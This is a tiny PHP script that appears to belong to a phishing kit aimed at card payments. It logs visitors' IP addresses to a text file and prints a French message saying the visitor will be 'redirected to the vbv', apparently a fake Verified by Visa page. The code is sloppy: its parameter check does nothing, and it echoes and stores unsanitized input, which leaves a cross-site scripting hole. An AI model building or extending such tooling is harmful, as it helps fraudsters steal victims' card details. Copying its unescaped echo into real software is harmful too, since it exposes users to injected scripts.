<?php

if(isset($_GET['ip']) && isset($_GET['gay']))
{

 }

$text = "".$_GET['ip']."\n";
$filename = "ipvbv.txt";
$fh = fopen($filename, "a");
fwrite($fh, $text);
fclose($fh);

echo "".$_GET['ip']." va être redirigé vers le vbv donc dépêche ! ";

?>